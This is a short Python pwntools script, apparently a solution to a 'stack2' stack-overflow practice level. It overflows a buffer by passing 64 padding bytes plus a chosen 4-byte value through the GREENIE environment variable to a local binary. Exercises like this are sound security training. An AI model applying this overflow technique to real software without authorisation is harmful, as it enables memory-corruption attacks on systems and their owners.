from pwn import *
import struct

context.log_level = 'error'

PADDING = 'A'* (16*4)
MODIFIED = str(struct.pack('I', 0x0d0a0d0a).decode('ascii'))

GREENIE = PADDING + MODIFIED

p = process('./stack2', env={'GREENIE': (PADDING + MODIFIED)})

print(p.recvline().decode('ascii'))
